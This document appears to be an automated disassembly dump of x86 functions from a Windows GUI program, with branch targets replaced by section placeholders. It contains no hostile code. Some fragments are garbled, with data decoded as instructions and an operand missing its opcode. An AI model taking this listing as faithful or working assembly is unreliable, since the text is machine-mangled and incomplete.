mov eax [ ebx + 0x170 ]
call sub_42420c
mov dx 0xb009
mov eax ebx
call sub_450818
pop ebx
retn
sub_453120
call sub_4507d8
retn
sub_453128
call sub_4507d8
retn
sub_453130
call sub_4507d8
retn
sub_453138
call sub_4507d8
retn
sub_45319c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_453632
jmp sub_403924
sub_453639
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453718
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_4538bc
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44e340
retn
sub_45395c
push ebx
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_453978
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_453b50
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_453a88
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_453ba8
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e340
sub_453bc8
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44e340
sub_453bec
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_453bf8
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44e340
sub_453ca4
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_453c48
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_453d80
jmp sub_403924
sub_453d87
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453fa6
jmp sub_403924
sub_453fad
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4540b4
call sub_44e110
retn
sub_454502
jmp sub_403924
sub_454598
mov eax [ r-xdata ]
retn
sub_4546ff
jmp sub_403924
sub_454810
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e340
sub_454830
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e340
sub_454b46
jmp sub_403924
sub_454c88
test [ eax + 0x52 ] 0x4
setne al
retn
sub_454de4
jmp sub_403924
sub_454deb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424904
retn
sub_454e07
jmp sub_403924
sub_454e14
retn
sub_454ee8
mov [ edx + 0xc ] 0xffffffff
retn
sub_454f46
jmp sub_403924
sub_454f4d
pop ecx
pop ecx
pop ebp
retn
sub_454fed
jmp sub_403924
sub_454ff4
pop ebx
mov esp ebp
pop ebp
retn
sub_455060
call sub_450fe0
retn
sub_4550f3
jmp sub_403924
sub_4550fa
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4552d9
jmp sub_403924
sub_4552e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45543c
push ebx
mov ebx eax
mov eax ebx
call sub_45a404
or edx 0xffffffff
mov eax ebx
call sub_455568
pop ebx
retn
sub_455514
jmp sub_403924
sub_455568
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_455454
sub_4556d8
push ebx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_4556f0
push ebx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4557dc
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_451c18
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_455877
jmp sub_403924
sub_45587e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4558a1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424904
retn
sub_45589a
jmp sub_403924
sub_4558a1
pop ebx
pop ecx
pop ebp
retn
sub_4558a8
retn
sub_455910
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_455c7d
jmp sub_403924
sub_455e64
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_456050
jmp sub_403924
sub_456100
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_456114
inc [ eax + 0x6c ]
retn
sub_456118
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_457998
sub_456278
call sub_456978
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_456c23
jmp sub_403924
sub_456c2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456c47
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_456c40
jmp sub_403924
sub_456c47
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456f28
jmp sub_403924
sub_456f2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f4c
mov eax [ ebp - 0x4 ]
call sub_424904
retn
sub_456f45
jmp sub_403924
sub_456f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f69
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_456f62
jmp sub_403924
sub_456f69
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45741d
jmp sub_403924
sub_457424
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4575af
jmp sub_403924
sub_4575b6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45766b
jmp sub_403924
sub_457672
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457760
jmp sub_403924
sub_4577b1
jmp sub_403924
sub_4577b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457874
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_456184
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_4579c0
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_455cc0
sub_4582c0
jmp sub_403924
sub_4582c7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458390
call GetCapture
retn
sub_458398
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cd10
pop ebx
retn
sub_4583a8
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_45860e
jmp sub_403924
sub_458808
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_458a1c
jmp sub_403924
sub_458a23
pop ebx
mov esp ebp
pop ebp
retn
sub_458a6e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_458aeb
jmp sub_403924
sub_458af2
pop ebp
retn
sub_458b7a
jmp sub_403924
sub_458b81
pop ebp
retn
sub_4592d0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4184cc
retn
sub_4592e8
mov al 0x1
retn
sub_4592ec
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_420b84
retn
mov eax edx
retn
sub_4592fc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_420b54
retn
mov al 0x1
retn
sub_4595ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418470
pop esi
pop ebx
retn
sub_459600
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_45963c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4598a0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_4598b4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_4598c8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_4598dc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_4598f0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_459904
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_459918
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_45992c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_459940
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_459954
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
pop ebx
retn
sub_459968
retn
sub_45996c
retn
sub_459970
retn
sub_459974
retn
sub_459978
retn
sub_45997c
retn
sub_459980
retn
sub_459984
retn
sub_459988
retn
sub_45998c
retn
sub_459990
retn
sub_459994
retn
sub_459c40
jmp sub_403924
sub_459fdc
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x90 ] eax
sub_45a004
push esi
mov si 0xffef
call sub_40338c
pop esi
retn
sub_45a0a5
jmp sub_403924
sub_45a0ac
pop ebp
retn
sub_45a0b0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
sub_45a2d8
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_45a4b1
jmp sub_403924
sub_45a4b8
pop ebx
pop ecx
pop ebp
retn
sub_45a4bc
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_45a4c4
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45a72c
sub_45a571
jmp sub_403924
sub_45a578
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403190
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_45a680
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_45a7bf
jmp sub_403924
sub_45a7c6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a85e
jmp sub_403924
sub_45a865
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a882
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_45a87b
jmp sub_403924
sub_45a882
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40338c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a959
jmp sub_403924
sub_45a997
jmp sub_403924
sub_45a99e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40338c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ab63
jmp sub_403924
sub_45ab6a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab87
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_45ab80
jmp sub_403924
sub_45ab87
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45ac00
retn
sub_45aba0
jmp sub_403924
sub_45abef
jmp sub_403924
sub_45abf6
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ac7f
jmp sub_403924
sub_45ac86
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ac8c
or edx 0xffffffff
call sub_45ac00
retn
sub_45b09b
jmp sub_403924
sub_45b0a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0bf
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_45b0b8
jmp sub_403924
sub_45b0bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0dc
mov eax [ ebp - 0x4 ]
call sub_45bbd4
retn
sub_45b0d5
jmp sub_403924
sub_45b0dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b2e0
jmp sub_403924
sub_45b2e7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b2ec
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40338c
sub_45b304
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416e0c
pop ebx
retn
sub_45b3a8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418314
sub_45b4bf
jmp sub_403924
sub_45b4c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403190
retn
sub_45b4dc
jmp sub_403924
sub_45b7ee
jmp sub_403924
sub_45b7f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b812
mov eax [ ebp - 0x10 ]
call sub_403190
retn
sub_45b80b
jmp sub_403924
sub_45b812
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b82f
mov eax [ ebp - 0x8 ]
call sub_403190
retn
sub_45b828
jmp sub_403924
sub_45b82f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b898
jmp sub_403924
sub_45b9b1
jmp sub_403924
sub_45b9ce
jmp sub_403924
sub_45bb86
jmp sub_403924
sub_45bb8d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bbd0
inc [ eax + 0x5c ]
retn
sub_45bbd4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40338c
sub_45bc28
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_45bc65
jmp sub_403924
sub_45bc6c
pop ebp
retn
sub_45bc70
sub [ rw-data ] 0x1
retn
sub_45cbd8
mov eax [ esp + 0x8 ]
retn
sub_45cbe0
push ebx
mov ebx eax
call sub_45cbd8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
jmp sub_40395c
sub_45cbfc
pop ebx
retn
sub_45ce75
jmp sub_403924
sub_45ce7c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cfc7
jmp sub_403924
sub_45cfce
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cfe4
push ebx
mov eax [ rw-data ]
call sub_4189e0
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41899c
mov eax ebx
pop ebx
retn
sub_45d16c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45d188
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45d883
jmp sub_403924
sub_45d88a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d982
jmp sub_403924
sub_45d989
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ddac
jmp sub_403924
sub_45ddb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45e25f
jmp sub_403924
sub_45e700
jmp sub_403924
sub_45e707
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45eb6b
jmp sub_403924
sub_45f028
jmp sub_403924
sub_45f02f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f3da
jmp sub_403924
sub_45f3e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45f3ef
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f59c
mov eax [ r-xdata ]
retn
sub_45f5d8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f5ec
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f5fc
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f60c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45f908
mov edx eax
sub_45f6a4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403340
mov edx esi
call sub_45f624
pop esi
pop ebx
retn
sub_45f720
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45f908
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4184cc
mov ecx eax
sub_45faf8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45fb60
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45ff08
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45ff3c
sub_45ff3c
mov edx sub_45ff14
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_45d064
retn
sub_460126
jmp sub_403924
sub_46012d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4605c4
jmp sub_403924
sub_460603
jmp sub_403924
sub_46060a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4607a8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4608e4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40338c
pop esi
pop ebp
retn 0x8
sub_460900
mov eax [ eax + 0x34 ]
call sub_45db38
retn
sub_46090c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40338c
pop esi
retn
sub_460948
push ebx
mov ecx sub_460920
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45d064
pop ebx
retn
sub_460b7c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_460b90
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_403670#6
jmp sub_403670
sub_460dc7
jmp sub_403924
sub_460df2
jmp sub_403924
sub_460df9
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460e10
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_460ff8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_460948
sub_461078
jmp sub_403924
sub_4610bc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4610d4
push ebx
mov ebx eax
mov eax ebx
call sub_420ba4
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_461126
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_460948
sub_46119c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4612e5
jmp sub_403924
sub_4612ec
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46152c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_46153c
sub_461590
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4615a0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_4615b0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4615c0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4615d0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_461648
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45d990
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_45d990
retn
sub_461664
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45d990
sub_4616ac
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_460900
retn
mov eax edx
retn
sub_4616e6
jmp sub_403670
sub_4616eb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461a51
jmp sub_403924
sub_461a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403190
retn
sub_461a6e
jmp sub_403924
sub_461b6f
jmp sub_403924
sub_461b76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461b93
mov eax [ ebp - 0x14 ]
call sub_403190
retn
sub_461b8c
jmp sub_403924
sub_461bb1
jmp sub_403924
sub_461c3b
jmp sub_403924
sub_461c42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461c74
push ebx
mov ebx eax
mov eax ebx
call sub_41860c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_421954
sub_461d38
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_461d4c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_461d54
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_462119
jmp sub_403924
sub_462120
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_462d9f
[ edi + edi * 8 - 0x2f002f ]
sub_462da6
stc
jmp esp
sub_464068
mov eax [ rw-data ]
retn
sub_464070
mov [ rw-data ] eax
retn
j_sub_403670#5
jmp sub_403670
sub_4641ef
jmp sub_403924
sub_4641f6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4643c4
call sub_42187c
retn
sub_464506
jmp sub_403924
sub_46450d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4645b1
jmp sub_403924
sub_4645b8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464648
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_464d74
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_465420
sub_464d90
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_464d74
sub_464eb0
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_465420
sub_464ec8
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_465420
sub_464ee0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_465420
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_464f0c
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_464f18
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_465420
retn
sub_4651f8
push ebx
mov ebx edx
mov edx ebx
call sub_450914
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_465268
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_465390
jmp sub_403924
sub_465397
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4653a0
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4647ac
mov eax [ ebx + 0x20c ]
call sub_4647ac
sub_465400
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_465410
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46550b
jmp sub_403924
sub_465518
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_465530
sub_46574c
retn
sub_4657ba
jmp sub_403924
sub_4657f9
jmp sub_403924
sub_46582c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_451e0c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_464a38
retn
sub_465850
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_451e2c
retn
mov ecx [ eax + 0x20c ]
